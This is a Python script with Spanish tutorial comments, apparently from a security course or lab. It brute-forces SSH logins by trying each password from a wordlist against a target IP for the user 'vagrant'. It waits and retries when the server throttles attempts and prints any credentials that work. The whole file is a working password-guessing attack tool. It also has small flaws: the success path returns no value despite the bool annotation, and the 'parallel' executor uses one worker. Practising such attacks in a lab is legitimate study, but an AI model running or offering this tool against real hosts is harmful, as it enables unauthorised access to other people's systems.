import paramiko, socket, time
from colorama import init, Fore
import concurrent.futures

# Inicializar colorama
init()

class SSHconector:
    VERDE = Fore.GREEN
    ROJO = Fore.RED
    RESET = Fore.RESET
    AZUL = Fore.BLUE

    # ': str' no fuerza a que solo acepte strings, solo que se espera que le pasemos un string
    def __init__(self, hostname: str, username: str):
        self.hostname = hostname
        self.username = username
        self.client = None
    
    # -> significa que nos va a devolver un dato del tipo bool. Este tipo de señas son informativas
    def conectar(self, password: str) -> bool:
        self.client = paramiko.SSHClient()
        # Para aceptar políticas automáticamente
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            self.client.connect(hostname=self.hostname, username=self.username, password=password, timeout=3)
        except socket.timeout:
            # Colorama: para poner el texto de un color como el rojo en este ejemplo, se arranca de esta forma y a lo última para dejar
            # de marcar el texto en rojo, se agrega el reset.
            print(f'{self.ROJO}[!] HOST: {self.hostname} no es alcanzable y se agotó el tiempo de espera. {self.RESET}')
            return False # Devuelve un bool así que se va a retornar un False
        except paramiko.AuthenticationException:
            print(f'{self.ROJO}[!] Credenciales inválidas para {self.username}:{password}{self.RESET}')
            return False # Porque no se han podido obtener las credenciales correctas.
        except paramiko.SSHException:
            print(F'{self.AZUL}[*] Cuota excedida, reintentando con retraso... {self.RESET}')
            # Como hay que meter un retraso, se usa sleep
            time.sleep(60)
            # Después de esperar 60 segundos, nos conectamos de nuevo 
            return self.conectar(password)
        else:
            print(f'{self.VERDE}[:)] Conexión exitosa con:\n\tHOSTNAME:{self.hostname}\n\tUSERNAME:{self.username}\n\tPASSWORD: {password}{self.RESET}')
        finally:
            if self.client:
                # Cerramos la conexión una vez terminamos
                self.client.close()
        
    def test_password(self, password_file):
        with open(password_file, 'r') as archivo:
            passwords = [line.strip() for line in archivo.readlines()]
        
        # Ejecución en paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            futures = [executor.submit(self.conectar, password) for password in passwords]
            for future in concurrent.futures.as_completed(futures):
                future.result()

if __name__ == '__main__':
    hostname = input('Ingrese la IP objetivo: ')
    username = 'vagrant'
    password_file = 'passwords.txt' # En caso de encontrarse en la ruta actual.
    conector = SSHconector(hostname, username)
    # Intento conectarme
    conector.test_password(password_file)